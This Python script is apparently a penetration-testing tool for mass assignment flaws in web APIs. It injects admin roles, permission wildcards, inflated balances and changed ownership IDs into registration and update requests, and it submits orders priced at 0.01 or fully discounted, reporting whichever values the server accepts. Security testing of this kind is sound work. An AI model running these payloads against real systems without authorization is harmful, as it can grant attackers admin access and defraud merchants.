#!/usr/bin/env python3
"""Agent for testing APIs for mass assignment vulnerabilities.

Tests API endpoints for auto-binding vulnerabilities where clients
can modify privileged fields (role, balance, permissions) by
including extra parameters in request bodies. OWASP API3:2023.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


PRIVILEGE_FIELDS = {
    "role_elevation": {"role": "admin", "user_role": "admin", "userRole": "admin",
                       "account_type": "admin", "accountType": "admin"},
    "admin_flags": {"is_admin": True, "isAdmin": True, "admin": True,
                    "is_superuser": True, "isSuperuser": True},
    "permissions": {"permissions": ["*"], "scopes": ["admin:*"],
                    "groups": ["administrators"], "roles": ["admin"]},
    "account_status": {"is_active": True, "verified": True,
                       "email_verified": True, "status": "active"},
    "financial": {"balance": 99999.99, "credit": 99999, "discount": 100,
                  "price": 0.01},
    "ownership": {"user_id": 1, "userId": 1, "owner_id": 1},
    "internal": {"internal_notes": "test", "debug": True, "is_featured": True},
    "temporal": {"created_at": "2020-01-01", "updated_at": "2020-01-01"},
}


class MassAssignmentTestAgent:
    """Tests APIs for mass assignment / auto-binding vulnerabilities."""

    def __init__(self, base_url, output_dir="./mass_assign_test"):
        self.base_url = base_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _req(self, method, path, headers=None, data=None, timeout=10):
        if not requests:
            return None
        try:
            return requests.request(method, f"{self.base_url}{path}",
                                    headers=headers, json=data, timeout=timeout)
        except requests.RequestException:
            return None

    def test_endpoint(self, method, path, base_payload, token):
        """Test a writable endpoint for mass assignment."""
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        results = []

        for category, fields in PRIVILEGE_FIELDS.items():
            test_payload = {**base_payload, **fields}
            resp = self._req(method, path, headers=headers, data=test_payload)
            if not resp or resp.status_code not in (200, 201):
                continue

            try:
                resp_data = resp.json()
            except (json.JSONDecodeError, ValueError):
                continue

            for field_name, injected in fields.items():
                actual = resp_data.get(field_name)
                if actual is not None and str(actual) == str(injected):
                    finding = {
                        "endpoint": f"{method} {path}",
                        "category": category,
                        "field": field_name,
                        "injected": injected,
                        "confirmed": True,
                    }
                    results.append(finding)
                    severity = "critical" if category in ("role_elevation", "admin_flags", "financial") else "high"
                    self.findings.append({
                        "severity": severity,
                        "type": "Mass Assignment",
                        "detail": f"{method} {path}: {field_name}={injected} accepted",
                        "owasp": "API3:2023",
                    })
        return results

    def verify_state_change(self, token, verification_path="/users/me",
                             field_name=None, expected_value=None):
        """Verify injected field persisted in the database."""
        headers = {"Authorization": f"Bearer {token}"}
        resp = self._req("GET", verification_path, headers=headers)
        if not resp or resp.status_code != 200:
            return False
        data = resp.json()
        actual = data.get(field_name)
        return actual is not None and str(actual) == str(expected_value)

    def test_registration(self, register_path="/auth/register", base_payload=None):
        """Test registration endpoint for mass assignment."""
        base = base_payload or {
            "email": "massassign_test@example.com",
            "password": "SecureP@ss123!",
            "name": "Test User",
        }
        results = []
        for category, fields in PRIVILEGE_FIELDS.items():
            test_payload = {**base, **fields}
            resp = self._req("POST", register_path, data=test_payload)
            if not resp or resp.status_code not in (200, 201):
                continue
            try:
                resp_data = resp.json()
            except (json.JSONDecodeError, ValueError):
                continue
            for field_name, injected in fields.items():
                actual = resp_data.get(field_name)
                if actual is not None and str(actual) == str(injected):
                    results.append({
                        "endpoint": f"POST {register_path}",
                        "field": field_name,
                        "injected": injected,
                    })
                    self.findings.append({
                        "severity": "critical",
                        "type": "Registration Mass Assignment",
                        "detail": f"Registration accepts {field_name}={injected}",
                    })
        return results

    def test_financial_manipulation(self, token, order_path="/orders"):
        """Test order/financial endpoints for price manipulation."""
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        payloads = [
            {"items": [{"product_id": 1, "quantity": 1}], "total": 0.01},
            {"items": [{"product_id": 1, "quantity": 1}], "discount_percent": 100},
            {"items": [{"product_id": 1, "quantity": 1}], "shipping_cost": 0, "tax": 0},
        ]
        results = []
        for payload in payloads:
            resp = self._req("POST", order_path, headers=headers, data=payload)
            if resp and resp.status_code in (200, 201):
                try:
                    data = resp.json()
                    total = float(data.get("total", 999))
                    if total < 1.0:
                        results.append({"payload": payload, "total": total})
                        self.findings.append({
                            "severity": "critical",
                            "type": "Price Manipulation",
                            "detail": f"Order created with total={total}",
                        })
                except (ValueError, TypeError, json.JSONDecodeError):
                    pass
        return results

    def generate_report(self, token=None, endpoints=None):
        registration = self.test_registration()
        endpoint_results = []
        if token and endpoints:
            for ep in endpoints:
                results = self.test_endpoint(
                    ep["method"], ep["path"], ep.get("base_payload", {}), token
                )
                endpoint_results.extend(results)

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "base_url": self.base_url,
            "registration_results": registration,
            "endpoint_results": endpoint_results,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "mass_assignment_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <base_url> [--token <jwt>]")
        sys.exit(1)
    url = sys.argv[1]
    token = None
    if "--token" in sys.argv:
        token = sys.argv[sys.argv.index("--token") + 1]
    agent = MassAssignmentTestAgent(url)
    agent.generate_report(token)


if __name__ == "__main__":
    main()
